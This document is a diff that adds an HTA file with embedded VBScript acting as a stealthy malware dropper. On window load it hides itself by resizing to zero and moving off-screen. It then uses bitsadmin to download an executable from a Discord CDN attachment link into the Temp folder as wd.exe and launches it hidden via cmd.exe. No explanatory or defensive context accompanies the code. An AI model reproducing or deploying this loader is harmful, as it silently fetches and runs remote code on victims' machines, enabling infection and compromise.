@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+<hta:application id="app" windowstate="minimize" showintaskbar="no" sysmenu="no" caption="no" />
+<script language="VBScript">
+Sub Window_OnLoad
+window.resizeTo 0, 0
+window.moveTo -2000, -2000
+Set objShell = CreateObject("WScript.Shell")
+cmd = "C:\\Windows\\System32\\bitsadmin.exe /transfer d /download /priority high ""https://cdn.discordapp.com/attachments/1520399304785788948/1523769075225067581/source_prepared.exe?ex=6a4d5009&is=6a4bfe89&hm=0dde198b605052eeec47bbb320f8fa8144276ce66d417a1cfae62ba01d697632&"" ""C:\\Users\\Admin\\AppData\\Local\\Temp\\wd.exe"""
+objShell.Run cmd, 0, True
+objShell.Run "cmd.exe /c C:\\Users\\Admin\\AppData\\Local\\Temp\\wd.exe", 0, False
+window.close
+End Sub
+</script>
+</head>
+<body></body>
+</html>
